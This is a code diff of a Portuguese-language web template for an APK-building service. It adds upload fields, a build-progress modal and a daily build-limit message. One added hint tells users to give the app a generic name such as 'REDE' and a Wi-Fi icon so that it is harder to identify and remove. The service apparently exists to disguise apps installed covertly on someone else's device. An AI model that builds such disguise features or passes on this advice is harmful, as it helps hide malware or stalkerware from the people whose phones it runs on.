@@ -19,18 +19,9 @@
                     <div class="field">
                         <label for="appName">Nome do app</label>
                         <input id="appName" type="text" x-model="appName" placeholder="Meu App">
+                        <p class="make-field-hint">*Recomendamos que utilize um nome genérico como REDE e uma foto de Wi-Fi para dificultar identificação e remoção do mesmo.</p>
                     </div>
-                    <div class="field">
-                        <label for="apk">Arquivo APK</label>
-                        <input id="apk" type="file" accept=".apk" @change="onApk($event)">
-                        <p class="make-file-name" x-show="apk" x-text="apk?.name"></p>
-                    </div>
-                    <div class="field">
-                        <label for="icon">Ícone (opcional)</label>
-                        <input id="icon" type="file" accept=".png,.jpg,.jpeg,.webp,.gif,.bmp,.ico,image/png,image/jpeg,image/webp,image/gif,image/bmp,image/x-icon" @change="onIcon($event)">
-                        <p class="make-file-name" x-show="icon" x-text="icon?.name"></p>
-                        <p class="make-file-error" x-show="iconError" x-text="iconError"></p>
-                    </div>
+                    {% include "partials/make_upload_fields.html" %}
                     <button type="submit" class="btn btn-build" :disabled="busy || !apk">
                         <svg class="btn-build__icon" viewBox="0 0 16 16" fill="none" aria-hidden="true">
                             <path d="M8 1.5 13.5 4.75V11.25L8 14.5 2.5 11.25V4.75L8 1.5Z" stroke="currentColor" stroke-width="1.25" stroke-linejoin="miter"/>
@@ -41,8 +32,93 @@
                 </form>
             </div>
         </section>
+    </div>
 
-        {% include "partials/make_build_output.html" %}
+    <div class="build-modal" x-show="buildModalOpen" x-cloak
+        @keydown.escape.window="(buildPhase === 'done' || buildPhase === 'error') && closeBuildModal()">
+        <div class="build-modal__backdrop"
+            @click="(buildPhase === 'done' || buildPhase === 'error') && closeBuildModal()"></div>
+        <div class="build-modal__dialog build-modal__dialog--enter" role="dialog" aria-modal="true" aria-label="Geração de APK">
+            <header class="build-modal__head">
+                <div>
+                    <p class="build-modal__tag" x-text="buildTag"></p>
+                    <h2 class="build-modal__title" x-text="buildTitle"></h2>
+                </div>
+                <button type="button" class="build-modal__close"
+                    x-show="buildPhase === 'done' || buildPhase === 'error'"
+                    @click="closeBuildModal()" aria-label="Fechar">×</button>
+            </header>
+
+            <div class="build-modal__body" x-show="buildPhase === 'submitting'">
+                <div class="checkout-loading checkout-loading--modal build-modal__loading">
+                    <div class="checkout-loading__ring" aria-hidden="true">
+                        <span class="checkout-loading__spinner"></span>
+                        <span class="checkout-loading__pulse"></span>
+                    </div>
+                    <p class="checkout-loading__title">Enviando app para análise</p>
+                    <p class="checkout-loading__sub">Aguarde enquanto validamos os arquivos</p>
+                    <ul class="checkout-loading__steps">
+                        <template x-for="(step, index) in submitSteps" :key="step">
+                            <li class="checkout-loading__step"
+                                :class="{ 'is-done': submitStep > index, 'is-active': submitStep === index }">
+                                <span class="checkout-loading__dot"></span>
+                                <span x-text="step"></span>
+                            </li>
+                        </template>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="build-modal__body" x-show="buildPhase === 'building'">
+                <div class="build-modal__progress">
+                    <p class="make-status build-modal__status">
+                        <span class="make-status__prompt">&gt;</span>
+                        <span x-text="status || 'Iniciando pipeline…'"></span>
+                    </p>
+                    <div class="make-progress build-modal__progress-bar" role="progressbar"
+                        :aria-valuenow="progress" aria-valuemin="0" aria-valuemax="100">
+                        <div class="make-progress__bar build-modal__progress-fill" :style="`width: ${progress}%`"></div>
+                    </div>
+                    <p class="make-progress__pct build-modal__pct" x-text="`${progress}%`"></p>
+                </div>
+            </div>
+
+            <div class="build-modal__body" x-show="buildPhase === 'done'">
+                <div class="build-modal__success">
+                    <div class="build-modal__success-ring" aria-hidden="true">
+                        <svg class="build-modal__success-icon" viewBox="0 0 24 24" fill="none">
+                            <path d="M6 12.5 10 16.5 18 8.5" stroke="currentColor" stroke-width="2" stroke-linecap="square"/>
+                        </svg>
+                    </div>
+                    <p class="build-modal__success-title">APK GERADO</p>
+                    <p class="build-modal__success-sub">Seu aplicativo foi compilado e está disponível na lista de apps.</p>
+                    <button type="button" class="btn btn-action build-modal__apps-btn" @click="goToApps()">
+                        <svg class="btn-icon" viewBox="0 0 16 16" fill="none" aria-hidden="true">
+                            <path d="M2 8h9" stroke="currentColor" stroke-width="1.5" stroke-linecap="square"/>
+                            <path d="M9 4.5 13 8 9 11.5" stroke="currentColor" stroke-width="1.5" stroke-linecap="square" stroke-linejoin="miter"/>
+                        </svg>
+                        <span>Conferir apps</span>
+                    </button>
+                </div>
+            </div>
+
+            <div class="build-modal__body" x-show="buildPhase === 'error'">
+                <div class="build-modal__error">
+                    <p class="build-modal__error-title">Falha na geração</p>
+                    <div x-show="limitError">
+                        <p class="build-modal__error-text">Limite diário de builds atingido.</p>
+                        <p class="build-modal__error-stats">
+                            Limite diário:
+                            <strong class="build-modal__error-value" x-text="limitError.limit"></strong>
+                            e tempo para reset do limite:
+                            <strong class="build-modal__error-value build-modal__error-value--time" x-text="limitError.resetIn"></strong>
+                        </p>
+                    </div>
+                    <p class="build-modal__error-text" x-show="!limitError" x-text="status || 'Não foi possível concluir o build.'"></p>
+                    <button type="button" class="btn btn-ghost" @click="closeBuildModal()">Fechar</button>
+                </div>
+            </div>
+        </div>
     </div>
 </div>
 {% endblock %}
